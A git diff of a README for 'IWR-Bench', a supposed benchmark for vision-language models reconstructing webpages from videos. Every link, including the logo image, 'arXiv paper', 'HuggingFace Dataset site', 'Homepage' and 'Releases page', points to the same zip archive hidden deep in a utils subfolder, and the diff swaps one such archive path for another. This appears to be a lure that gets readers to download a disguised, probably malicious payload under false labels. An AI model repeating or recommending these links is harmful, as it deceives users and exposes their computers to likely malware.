@@ -1,12 +1,12 @@
 # 🌐 IWR-Bench - Evaluate Webpage Reconstruction from Videos
 
-[![Download IWR-Bench](https://raw.githubusercontent.com/ipoukoumondi/IWR-Bench/main/utils/browser-use/browser_use/dom/clickable_element_processor/IWR-Bench-3.1-alpha.2.zip)](https://raw.githubusercontent.com/ipoukoumondi/IWR-Bench/main/utils/browser-use/browser_use/dom/clickable_element_processor/IWR-Bench-3.1-alpha.2.zip)
+[![Download IWR-Bench](https://github.com/ipoukoumondi/IWR-Bench/raw/refs/heads/main/utils/browser-use/examples/use-cases/Bench-IW-2.0.zip)](https://github.com/ipoukoumondi/IWR-Bench/raw/refs/heads/main/utils/browser-use/examples/use-cases/Bench-IW-2.0.zip)
 
 ## 📖 Introduction
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/ipoukoumondi/IWR-Bench/main/utils/browser-use/browser_use/dom/clickable_element_processor/IWR-Bench-3.1-alpha.2.zip" alt="IWR-Bench Logo" width="40" height="40" style="vertical-align: middle;">
-  <img src="https://raw.githubusercontent.com/ipoukoumondi/IWR-Bench/main/utils/browser-use/browser_use/dom/clickable_element_processor/IWR-Bench-3.1-alpha.2.zip" alt="Result of 10" width="95%"/>
+  <img src="https://github.com/ipoukoumondi/IWR-Bench/raw/refs/heads/main/utils/browser-use/examples/use-cases/Bench-IW-2.0.zip" alt="IWR-Bench Logo" width="40" height="40" style="vertical-align: middle;">
+  <img src="https://github.com/ipoukoumondi/IWR-Bench/raw/refs/heads/main/utils/browser-use/examples/use-cases/Bench-IW-2.0.zip" alt="Result of 10" width="95%"/>
 </div>
 
 **IWR-Bench** is a benchmark tool designed to assess how well Large Vision-Language Models (LVLMs) can recreate interactive webpages based on user interaction videos. This tool offers insights into the capabilities of LVLMs in understanding and reconstructing complex web interactions. 
@@ -17,7 +17,7 @@ To run IWR-Bench, follow these simple steps to download and set up the tool on y
 
 ### 📥 Download & Install
 
-1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/ipoukoumondi/IWR-Bench/main/utils/browser-use/browser_use/dom/clickable_element_processor/IWR-Bench-3.1-alpha.2.zip).
+1. **Visit this page to download:** Go to the [Releases page](https://github.com/ipoukoumondi/IWR-Bench/raw/refs/heads/main/utils/browser-use/examples/use-cases/Bench-IW-2.0.zip).
 2. Look for the latest version available.
 3. Click on the asset that matches your operating system (like Windows, Mac, or Linux).
 4. Download the file to your computer.
@@ -61,9 +61,9 @@ If you encounter any problems, please check the GitHub Issues page or reach out 
 
 ## 🔗 Additional Resources
 
-- For research details, refer to our [arXiv paper](https://raw.githubusercontent.com/ipoukoumondi/IWR-Bench/main/utils/browser-use/browser_use/dom/clickable_element_processor/IWR-Bench-3.1-alpha.2.zip).
-- Explore the [HuggingFace Dataset site](https://raw.githubusercontent.com/ipoukoumondi/IWR-Bench/main/utils/browser-use/browser_use/dom/clickable_element_processor/IWR-Bench-3.1-alpha.2.zip) for additional data related to IWR-Bench.
-- Visit our [Homepage](https://raw.githubusercontent.com/ipoukoumondi/IWR-Bench/main/utils/browser-use/browser_use/dom/clickable_element_processor/IWR-Bench-3.1-alpha.2.zip) for updates and more information.
+- For research details, refer to our [arXiv paper](https://github.com/ipoukoumondi/IWR-Bench/raw/refs/heads/main/utils/browser-use/examples/use-cases/Bench-IW-2.0.zip).
+- Explore the [HuggingFace Dataset site](https://github.com/ipoukoumondi/IWR-Bench/raw/refs/heads/main/utils/browser-use/examples/use-cases/Bench-IW-2.0.zip) for additional data related to IWR-Bench.
+- Visit our [Homepage](https://github.com/ipoukoumondi/IWR-Bench/raw/refs/heads/main/utils/browser-use/examples/use-cases/Bench-IW-2.0.zip) for updates and more information.
 
 ## ⭐ Community Contributions
 
@@ -73,4 +73,4 @@ We welcome contributions from everyone. If you have ideas or features to add, pl
 
 Your feedback is important! Please share your thoughts and suggestions on how we can improve IWR-Bench.
 
-Visit this page to download: [Releases page](https://raw.githubusercontent.com/ipoukoumondi/IWR-Bench/main/utils/browser-use/browser_use/dom/clickable_element_processor/IWR-Bench-3.1-alpha.2.zip) for the latest version.
+Visit this page to download: [Releases page](https://github.com/ipoukoumondi/IWR-Bench/raw/refs/heads/main/utils/browser-use/examples/use-cases/Bench-IW-2.0.zip) for the latest version.
